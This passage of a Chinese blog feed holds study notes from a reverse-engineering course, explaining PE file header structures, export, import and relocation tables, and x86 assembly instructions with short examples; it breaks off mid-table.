class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">typedefstruct_IMAGE_OPTIONAL_HEADER</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Standard fields.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">+<span class="number">18</span>h    WORD    Magic;<span class="comment">// 标志字, ROM 映像（0107h）,普通可执行文件32位（010Bh）,普通可执行文件64位（020Bh）</span></span><br><span class="line">+<span class="number">1</span>Ah    BYTE    MajorLinkerVersion;<span class="comment">// 链接程序的主版本号</span></span><br><span class="line">+<span class="number">1B</span>h    BYTE    MinorLinkerVersion;<span class="comment">// 链接程序的次版本号</span></span><br><span class="line">+<span class="number">1</span>Ch    DWORD   SizeOfCode;<span class="comment">// 所有代码节的总大小，必须是FileAlignment的整数倍，编译器填写的，没用</span></span><br><span class="line">+<span class="number">20</span>h    DWORD   SizeOfInitializedData;<span class="comment">// 已初始化数据的总大小，必须是FileAlignment的整数倍，编译器填写的，没用</span></span><br><span class="line">+<span class="number">24</span>h    DWORD   SizeOfUninitializedData;<span class="comment">// 未初始化数据（没赋初始值）的总大小，必须是FileAlignment的整数倍，编译器填写的，没用</span></span><br><span class="line">+<span class="number">28</span>h    DWORD   AddressOfEntryPoint;<span class="comment">// 程序执行入口RVA（OEP）</span></span><br><span class="line">+<span class="number">2</span>Ch    DWORD   BaseOfCode;<span class="comment">// 代码的区块的起始RVA，编译器填写的，没用</span></span><br><span class="line">+<span class="number">30</span>h    DWORD   BaseOfData;<span class="comment">// 数据的区块的起始RVA，编译器填写的，没用</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// NT additional fields.    以下是属于NT结构增加的领域。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">+<span class="number">34</span>h    DWORD   ImageBase;<span class="comment">// 程序的首选装载地址</span></span><br><span class="line">+<span class="number">38</span>h    DWORD   SectionAlignment;<span class="comment">// 内存中的区块的对齐大小</span></span><br><span class="line">+<span class="number">3</span>Ch    DWORD   FileAlignment;<span class="comment">// 文件中的区块的对齐大小</span></span><br><span class="line">+<span class="number">40</span>h    WORD    MajorOperatingSystemVersion;<span class="comment">// 要求操作系统最低版本号的主版本号</span></span><br><span class="line">+<span class="number">42</span>h    WORD    MinorOperatingSystemVersion;<span class="comment">// 要求操作系统最低版本号的副版本号</span></span><br><span class="line">+<span class="number">44</span>h    WORD    MajorImageVersion;<span class="comment">// 可运行于操作系统的主版本号</span></span><br><span class="line">+<span class="number">46</span>h    WORD    MinorImageVersion;<span class="comment">// 可运行于操作系统的次版本号</span></span><br><span class="line">+<span class="number">48</span>h    WORD    MajorSubsystemVersion;<span class="comment">// 要求最低子系统版本的主版本号</span></span><br><span class="line">+<span class="number">4</span>Ah    WORD    MinorSubsystemVersion;<span class="comment">// 要求最低子系统版本的次版本号</span></span><br><span class="line">+<span class="number">4</span>Ch    DWORD   Win32VersionValue;<span class="comment">// 莫须有字段，不被病毒利用的话一般为0</span></span><br><span class="line">+<span class="number">50</span>h    DWORD   SizeOfImage;<span class="comment">// ImageBuffer装入内存后的总尺寸，可以比实际的尺寸大，但必须是SectionAlignment的整数倍</span></span><br><span class="line">+<span class="number">54</span>h    DWORD   SizeOfHeaders;<span class="comment">// 所有头（DOS NT） + 区块表（节表）的尺寸大小，必须是FileAlignment的整数倍</span></span><br><span class="line">+<span class="number">58</span>h    DWORD   CheckSum;<span class="comment">// ImageBuffer的校检和，一些系统文件会有要求，用来判断文件是否被修改。我们正常写的程序大部分都是0</span></span><br><span class="line">+<span class="number">5</span>Ch    WORD    Subsystem;<span class="comment">// 可执行文件期望的子系统</span></span><br><span class="line">+<span class="number">5</span>Eh    WORD    DllCharacteristics;<span class="comment">// DllMain()函数何时被调用，默认为 0</span></span><br><span class="line">+<span class="number">60</span>h    DWORD   SizeOfStackReserve;<span class="comment">// 初始化时的栈大小</span></span><br><span class="line">+<span class="number">64</span>h    DWORD   SizeOfStackCommit;<span class="comment">// 初始化时实际提交的栈大小</span></span><br><span class="line">+<span class="number">68</span>h    DWORD   SizeOfHeapReserve;<span class="comment">// 初始化时保留的堆大小</span></span><br><span class="line">+<span class="number">6</span>Ch    DWORD   SizeOfHeapCommit;<span class="comment">// 初始化时实际提交的堆大小</span></span><br><span class="line">+<span class="number">70</span>h    DWORD   LoaderFlags;<span class="comment">// 与调试有关，默认为 0</span></span><br><span class="line">+<span class="number">74</span>h    DWORD   NumberOfRvaAndSizes;<span class="comment">// 下边数据目录的项数，这个字段自Windows NT 发布以来一直是16</span></span><br><span class="line">+<span class="number">78</span>h    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];<span class="comment">// 数据目录表</span></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><p><strong>程序的执行入口在AddressOfEntryPoint（OEP）+ ImageBase</strong></p><p><img src="https://i.loli.net/2020/09/25/ImKsLvRAM4ey8xG.png" alt="image-20200925204629746"></p><p>ImageBuffer的内存位置由ImageBase决定。OEP有可能在代码区偏远的地方，而不一定是在代码节的开头。（如果不记得或者有疑惑建议去od和winhex看看）</p><h2 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h2><p>PE文件中节的属性被定义在节表中。40字节。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">       BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">// 节表名称,如&quot;.text&quot;</span></span><br><span class="line">       <span class="comment">//IMAGE_SIZEOF_SHORT_NAME=8</span></span><br><span class="line">        <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">         &#123;</span></span><br><span class="line">                DWORD PhysicalAddress;      <span class="comment">// 节区的物理地址</span></span><br><span class="line">                DWORD VirtualSize;          <span class="comment">// 节区的真实长度（说真实长度是因为未初始化的值不会在文件中显示，但是内存可以计算出没有初始化的值，真实长度包含未初始化的值）。这两个值是一个联合结构，可以使用其中的任何一个，一般是取后一个。可以被修改</span></span><br><span class="line">        &#125; Misc;</span><br><span class="line">        DWORD VirtualAddress;               <span class="comment">// 节区的 RVA 地址</span></span><br><span class="line">        DWORD SizeOfRawData;                <span class="comment">// 在文件中对齐后的尺寸</span></span><br><span class="line">        DWORD PointerToRawData;             <span class="comment">// 节区在文件中的偏移量(离0有多远)(FOA)</span></span><br><span class="line">        DWORD PointerToRelocations;         <span class="comment">// 在OBJ文件中使用（exe无意义），重定位的偏移</span></span><br><span class="line">        DWORD PointerToLinenumbers;         <span class="comment">// 行号表的偏移（供调试使用）</span></span><br><span class="line">        WORD NumberOfRelocations;           <span class="comment">// 在OBJ文件中使用（exe无意义），重定位数目</span></span><br><span class="line">        WORD NumberOfLinenumbers;           <span class="comment">// 行号表中行号的数目（供调试使用）</span></span><br><span class="line">        DWORD Characteristics;              <span class="comment">// 节属性如可读，可写，可执行等</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p><code>Name</code>并不遵守必须以”\0”结尾的规律，如果不是以”\0”结尾，系统会截取8个字节的长度进行处理。</p><p>Misc可能会比VirtualAddress要大，例如<code>char a[1000];</code>，你声明了但是没有初始化，在文件中计算机不会分配空间，但是在内存中拉伸开就会分配1000。</p><h1 id="数据目录"><a href="#数据目录" class="headerlink" title="数据目录"></a>数据目录</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DATA_DIRECTORY STRUCT</span><br><span class="line">&#123;</span><br><span class="line">DWORD VirtualAddress;         <span class="comment">// 数据的起始RVA</span></span><br><span class="line">DWORD Size;<span class="comment">// 数据块的长度</span></span><br><span class="line">&#125;</span><br><span class="line">IMAGE_DATA_DIRECTORY ENDS</span><br></pre></td></tr></table></figure><h2 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h2><p>数据目录的第一个结构就是导出表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">+<span class="number">0</span>    DWORD   Characteristics;<span class="comment">// 未使用</span></span><br><span class="line">+<span class="number">4</span>    DWORD   TimeDateStamp;<span class="comment">// 时间戳</span></span><br><span class="line">+<span class="number">8</span>    WORD    MajorVersion;<span class="comment">// 未使用</span></span><br><span class="line">+<span class="number">10</span>    WORD    MinorVersion;<span class="comment">// 未使用</span></span><br><span class="line">+<span class="number">12</span>    DWORD   Name;<span class="comment">// 指向该导出表文件名字符串</span></span><br><span class="line">+<span class="number">16</span>    DWORD   Base;<span class="comment">// 导出函数起始序号</span></span><br><span class="line">+<span class="number">20</span>    DWORD   NumberOfFunctions;<span class="comment">// 所有导出函数的个数</span></span><br><span class="line">+<span class="number">24</span>    DWORD   NumberOfNames;<span class="comment">// 以函数名字导出的函数个数</span></span><br><span class="line">+<span class="number">28</span>    DWORD   AddressOfFunctions;     <span class="comment">// 导出函数地址表RVA</span></span><br><span class="line">+<span class="number">32</span>    DWORD   AddressOfNames;         <span class="comment">// 导出函数名称表RVA</span></span><br><span class="line">+<span class="number">36</span>    DWORD   AddressOfNameOrdinals;  <span class="comment">// 导出函数序号表RVA</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>AddressOfFunctions表里有可能有0，NumberOfFunctions未必是导出函数的个数。</p><p>如果用序号来导出，例如2 3 5 7 8，它会认为你有8-2+1=7个函数，AddressOfFunctions就会补上0</p><p>序号导出用不到序号表AddressOfNameOrdinals，可以直接找。<strong>序号表是为了找函数名称</strong>。如果函数名称写的是noname（隐藏名字），则就算有序号，函数序号也不会出现在函数表中。</p><p><img src="https://i.loli.net/2020/11/03/M5CyaRx63Wmcg8e.png" alt="image-20201103164406434"></p><p>通过函数名找到函数地址：如图所示</p><p>通过序号找到函数地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int value = 序号-base;</span><br><span class="line">函数地址 = AddressOfFunctions[序号-base]</span><br></pre></td></tr></table></figure><p><strong>导出表是利用”函数地址表”排的序：</strong></p><p><img src="https://i.loli.net/2020/11/30/pljM6d2rFSNHcnO.png" alt="image-20201130203727246"></p><p><img src="https://i.loli.net/2020/11/30/tfxeZPuhNc3r8Y4.png"></p><ul><li><p>第一个函数地址100f，它的索引是0，然后计算机就去序号表找0，如果找到了，就说明是用函数名称导出的。计算机找到了序号表索引为2的值是0，然后在函数名称表找到索引第二个名称Plus；</p></li><li><p>第三个函数地址0，计算机会直接跳过这个无效地址，不过它在内存地址中是真实存在的；</p></li><li><p>第四个函数地址100a，它的索引是3，计算机去序号表找不到3，所以这个是用序号导出的。索引是3，加上base的值2，导出序号就是5。</p></li></ul><h2 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h2><p>建议看看此<a href="https://www.cnblogs.com/predator-wang/p/4962775.html">链接</a>，写得比我要清楚</p><p>数据目录的第六个结构是重定位表</p><ol><li>一般情况下，EXE都是可以按照ImageBase的地址进行加载的，因为Exe拥有自己独立的4GB的虚拟内存空间。但DLL不是，DLL是当有EXE使用它，才会加载到相关EXE的进程空间的。</li><li>为了提高搜索的速度，模块间的地址也是要对齐的，模块地址对齐为10000H，也就是64K。</li></ol><p>编译时生成的地址都是ImageBase+RVA，但是全局变量或者字符串会直接给一个地址，假设在程序加载的时候，没有按照预定的400000载入指定位置，但是全局变量和字符串等等，地址是不会改变的，然后就会出错，所以需要重定位表来记录要修正的地方。</p><p>如果程序能够按照预定的ImageBase来加载的话，那么就不需要重定位表。所以exe很少有重定位表，而DLL大多都有重定位表。因为首先把exe加载到内存中，不会被占位，而dll很多，可能会出错。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfBlock;</span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_BASE_RELOCATION, * PIMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/12/01/hLU7Z6xGHFitlwB.png"></p><p>SizeOfBlock指的是当前块一共有多少字节</p><p>有多少块是不确定的，除去开头两个，后面的数据宽度都是2个字节</p><p>RVA=VirtualAddress+后面双字地址</p><p><strong>在比较靠近的重定位表项中，32位指针的高位地址总是相同的，如果把这些相近表项的高位地址统一表示，那么就可以省略一部分的空间。</strong></p><p><strong>计算机会把每一页里需要修改的数据放在一个块里。当按照一个内存页来分割时，在一个页面中寻址需要的指针位数是12位（一页等于4096字节，等于2的12次方），而两字节有16位，用12位即可表示当前页全部地址，多所以出的四位（多出四位的主要原因是因为对齐）用于描述是否需要重定向，如果值为0011则进行重定向。因为还有一种情况不需要重定向，那就是对齐</strong></p><p><strong>但凡涉及到直接寻址的指令都需要进行重定位处理</strong></p><p>把内存中需要重定位的数据按页的大小0x1000分为若干个块，而这个VirtualAddress就是每个块的起始RVA。如一个重定位项是33f2，去掉高位的3，得到3f2，再加上这个重定位块的VirtualAddress,00011000，就得到000113f2。只知道块的RVA当然还不行，我们要知道每一个需要重定位数据的具体地址。在程序没有被真正加载（得到真实的起始地址）之前，就用ImageBase作为基址（这时的ImageBase是00400000），相加得到004113f2。</p><p><strong>我的理解：</strong></p><p>如果一个dll装载程序的过程中，位置被其他dll占了，则需要修改imagebase，以及修改重定位表。因为一些全局变量的值需要使用重定位表修改，否则dll无法正常使用。</p><p>修复方式：</p><p>新imagebase-本来需要装载的imagebase</p><p>然后重定位表的RVA加上差值即可。</p><br><h2 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h2><p>数据目录的第二个结构是导入表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">+<span class="number">0</span>  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;</span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">//RVA 指向IMAGE_THUNK_DATA结构的数组INT(Import Name Table)</span></span><br><span class="line">    &#125;;</span><br><span class="line">+<span class="number">4</span>    DWORD   TimeDateStamp;              <span class="comment">//时间戳</span></span><br><span class="line">+<span class="number">8</span>    DWORD   ForwarderChain;</span><br><span class="line">+<span class="number">12</span>    DWORD   Name;<span class="comment">//RVA,指向dll名字，该名字已0结尾</span></span><br><span class="line">+<span class="number">16</span>    DWORD   FirstThunk;                 <span class="comment">//RVA,指向IMAGE_THUNK_DATA结构的数组IAT(Import Address Table)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>IMAGE_THUNK_DATA：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PBYTE  ForwarderString;</span><br><span class="line">        PDWORD Function;</span><br><span class="line">        DWORD Ordinal;<span class="comment">//序号</span></span><br><span class="line">        PIMAGE_IMPORT_BY_NAME  AddressOfData;<span class="comment">//指向IMAGE_IMPORT_BY_NAME</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure><p>IMAGE_THUNK_DATA判断最高位是否为1，如果是，除去最高位的值就是函数的导出序号。如果不是，那么这个值是一个RVA，指向IMAGE_IMPORT_BY_NAME。然后通过调用<code>GetProcAddr(m,函数的名字或者导出序号);</code>获取地址。</p><p>PIMAGE_IMPORT_BY_NAME：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;<span class="comment">//可能为空，编译器决定 如果不为空 是函数在导出表中的索引</span></span><br><span class="line">    BYTE    Name[<span class="number">1</span>];<span class="comment">//函数名称，以0结尾</span></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><p>加载前：</p><p><img src="https://i.loli.net/2020/12/10/dlayIvspiN6LQqm.png" alt="image-20201210192501792"></p><p>加载后：</p><p><img src="https://i.loli.net/2020/12/10/1fSquIi9wU3WJzO.png" alt="image-20201210192509954"></p><br><h2 id="绑定导入表"><a href="#绑定导入表" class="headerlink" title="绑定导入表"></a>绑定导入表</h2><p>数据目录的第12个结构是导入表</p><p>未加载的FirstThunk里未必是序号或者是函数名字的RVA，还有可能是已经加载好的函数地址。windows的大多数应用程序都采用了这种方法，能让程序启动的更快。</p><p>但是这种方法有弊端：</p><ol><li><p>dll没占到位置</p></li><li><p>dll被修改了</p></li></ol><p>那计算机如何判断FirstThunk是否绑定地址呢？</p><p>记得前面的TimeDateStamp时间戳吗，如果它的值为0，则表示IAT没有被绑定。如果它的值为-1（FFFFFFFF），则表示已经被绑定了。绑定的时间存在绑定导入表中的TimeDateStamp。<strong>当IMAGE_BOUND_IMPORT_DESCRIPTOR结构中的TimeDateStamp与DLL文件标准PE头中的TimeDateStamp值不相符时，或者DLL需要重新定位的时候，就会重新计算IAT中的值。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BOUND_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    DWORD   TimeDateStamp;<span class="comment">//时间戳，用来检查dll是否被更新</span></span><br><span class="line">    WORD    OffsetModuleName;<span class="comment">//dll的名字</span></span><br><span class="line">    WORD    NumberOfModuleForwarderRefs;<span class="comment">//本程序依赖另外的dll有几个</span></span><br><span class="line"><span class="comment">// Array of zero or more IMAGE_BOUND_FORWARDER_REF follows</span></span><br><span class="line">&#125; IMAGE_BOUND_IMPORT_DESCRIPTOR,  *PIMAGE_BOUND_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BOUND_FORWARDER_REF</span> &#123;</span></span><br><span class="line">    DWORD   TimeDateStamp;<span class="comment">//时间戳，用来检查dll是否被更新</span></span><br><span class="line">    WORD    OffsetModuleName;<span class="comment">//dll的名字</span></span><br><span class="line">    WORD    Reserved;<span class="comment">//保留，没有意义</span></span><br><span class="line">&#125; IMAGE_BOUND_FORWARDER_REF, *PIMAGE_BOUND_FORWARDER_REF;</span><br></pre></td></tr></table></figure><p>如果NumberOfModuleForwarderRefs的值为2，则在<code>_IMAGE_BOUND_IMPORT_DESCRIPTOR</code>结构后面会跟两个<code>_IMAGE_BOUND_FORWARDER_REF</code>结构。结束时会有个全0的结构。</p><p>OffsetModuleName计算的方法： 第一个*(_IMAGE_BOUND_IMPORT_DESCRIPTOR )+OffsetModuleName</p><br><h2 id="IAT表"><a href="#IAT表" class="headerlink" title="IAT表"></a>IAT表</h2><p>4070bc是exe的地址，Y是dll的地址。</p><p><img src="https://i.loli.net/2020/12/10/tMngayd4UbAfmLu.png" alt="image-20201210081552204"></p><p>Q.为什么调用dll要这么设计，而不是直接使用地址。</p><p>A.因为重定位表只能修复自己的文件，比如一个dll只能修复这个dll里的地址，一个exe只能修复这个exe里的地址。所以如果dll的位置被占了，只修复自己的地址，会导致exe无法调用该dll。而exe就不需要修改，因为一般来说，编译时exe是第一个占位置的，所以没人占他的位置。</p><p><strong>这些记录dll的Y指向的地址会组成一个表，表里存着函数的真正地址</strong>，因为程序要调用很多系统dll，如果我们的dll地址发生改变，要对每一处调用修改其调用地址是很麻烦的，如果有这样的表，我们将所有的函数调用的入口地址集中在一个集中的地址中，然后通过解析这个表方便我们进行修改，这样我们只要修改这个表所指的函数地址。</p><p>所以这个表不能随便移动，因为这些Y的值，在程序编译的时候就已经生成了，所以强行移动代价会很大。</p>]]></content>
      
      
      <categories>
          
          <category> 2020年9月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[视频笔记] 滴水逆向_汇编指令</title>
      <link href="/2020/09/19/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/"/>
      <url>/2020/09/19/%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><table><thead><tr><th>32位寄存器</th><th>16位寄存器</th><th>8位寄存器</th><th>主要用途</th><th>编号</th></tr></thead><tbody><tr><td>EAX</td><td>AX</td><td>AL</td><td>累加器</td><td>0</td></tr><tr><td>ECX</td><td>CX</td><td>CL</td><td>计数</td><td>1</td></tr><tr><td>EDX</td><td>DX</td><td>DL</td><td>I/O指针</td><td>2</td></tr><tr><td>EBX</td><td>BX</td><td>BL</td><td>DS段的数据指针</td><td>3</td></tr><tr><td>ESP</td><td>SP</td><td>AH</td><td>堆栈指针</td><td>4</td></tr><tr><td>EBP</td><td>BP</td><td>CH</td><td>SS段的数据指针</td><td>5</td></tr><tr><td>ESI</td><td>SI</td><td>DH</td><td>字符串操作的源指针；SS段的数据指针</td><td>6</td></tr><tr><td>EDI</td><td>DI</td><td>BH</td><td>字符串操作的目标指针；ES段的数据指针</td><td>7</td></tr></tbody></table><br><h1 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h1><p>汇编指令由操作码和操作数组成</p><p>例：</p><p><code>mov eax,1</code></p><p>mov是操作码，1是源操作数，eax是目标操作数</p><ul><li>源操作数和目标操作数不能同时为内存单元。</li><li>操作数宽度必须一样</li></ul><p><code>pushad</code>把8个通用寄存器的值存到堆栈里去，用<code>popad</code>弹出。</p><p><code>push，pop</code>不能压入或弹出8位寄存器或者内存。</p><p><code>jmp</code>指令，修改eip的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp short //跳转的值离原来的值小与128字节，就用short</span><br></pre></td></tr></table></figure><p><code>call</code>指令，修改eip的值，并会把下一行指令的地址压入栈。<br><strong>call的本质就是jmp 地址，push 下一条指令的地址</strong></p><p><code>retn</code>指令，弹出栈中的地址并跳转。<br><strong>retn的本质就是pop eip。</strong></p><p><code>cmp</code>指令：比较两个操作数，<strong>相当于sub指令，但是相减的结构不存，只根据相减的结果改变标志位，当两个操作数相等时，ZF位1。</strong><br>一般用于比较两个数是否相等。</p><p><code>test</code>指令：两个数进行与操作，改变标志位。<br>一般用于判断寄存器是否等于0。</p><p><code>lea eax, dword ptr ds:[12ffc4]</code><br>取地址，eax的值为12ffc4，而不是地址中存储的值。</p><p><code>adc</code>带进位加法，adc ax,bx的意思是a=ax+bx+cf</p><p><code>sbb</code>带进位减法</p><p><code>xchg</code>交换，交换两个寄存器或内存的值。</p><p><code>movs</code>移动数据</p><p><code>movsb</code>的意思是mov byte，移动esi中地址数据到edi中，同时esi,edi都加1；</p><p><code>movsw</code>的意思是mov word，移动esi中地址数据到edi中，同时esi,edi都加2；</p><p><code>movsd</code>的意思是mov dword，移动esi中地址数据到edi中，同时esi,edi都加4。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov esi,0x19FF74</span><br><span class="line">mov edi,0x19FF90</span><br><span class="line">movs byte ptr es:[edi],byte ptr ds:[esi]//movsb其实就是这个的简写</span><br></pre></td></tr></table></figure><p>受df标志位影响，如果df标志位为1，则从加变成减。</p><p><code>stos</code>，将AL/AX/EAX的值存储到[EDI]指定的内存单元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stos byte ptr es:[edi]//简写为stosb，edi加1；</span><br><span class="line">stos word ptr es:[edi]//简写为stosw，edi加2；</span><br><span class="line">stos dword ptr es:[edi]//简写为stosd，edi加4；</span><br></pre></td></tr></table></figure><p>受df标志位影响，如果df标志位为1，则从加变成减。</p><p><code>rep</code>指令，按计数寄存器（ecx）中指定的次数重复执行字符串指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ecx,10</span><br><span class="line">rep movsd//重复16次</span><br><span class="line">rep stosd//重复16次</span><br></pre></td></tr></table></figure><p><code>movsx</code>指令：用于有符号类型转换，先<strong>符号</strong>扩展，再移动。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov al,0xff</span><br><span class="line">movsx cx,al;cx的值为ffff</span><br><span class="line">mov al,0x1f</span><br><span class="line">movsx cx,al;cx的值为001f</span><br></pre></td></tr></table></figure><p>符号扩展的意思是用符号位填充少的宽度。</p><p><code>movzx</code>指令：用于无符号类型转换，先零扩展，再移动。<br>零扩展的意思是用0填充少的宽度。</p><p><code>sete</code>用于设置bool值，可以参照jcc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov eax,dword ptr [ebp+8]</span><br><span class="line">xor ecx,ecx</span><br><span class="line">cmp eax,dword ptr [ebp+0ch]</span><br><span class="line">sete cl</span><br></pre></td></tr></table></figure><p>效果cl=zf，如果[ebp+8]=[ebp+0ch]则eax为1</p><p><code>offset</code>可以看成一个地址</p><h2 id="jcc"><a href="#jcc" class="headerlink" title="jcc"></a>jcc</h2><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>JE，JZ</td><td>结果为0时跳转</td><td>ZF = 1</td></tr><tr><td>JNE，JNZ</td><td>结果不为0时跳转</td><td>ZF = 0</td></tr><tr><td>JS</td><td>结果为负则跳转</td><td>SF = 1</td></tr><tr><td>JNS</td><td>结果为非负则跳转</td><td>SF = 0</td></tr><tr><td>JP，JPE</td><td>结果中1的个数为偶数则跳转</td><td>PF = 1</td></tr><tr><td>JNP，JPO</td><td>结果中1的个数为奇数则跳转</td><td>PF = 0</td></tr><tr><td>JO</td><td>结果溢出则跳转</td><td>OF = 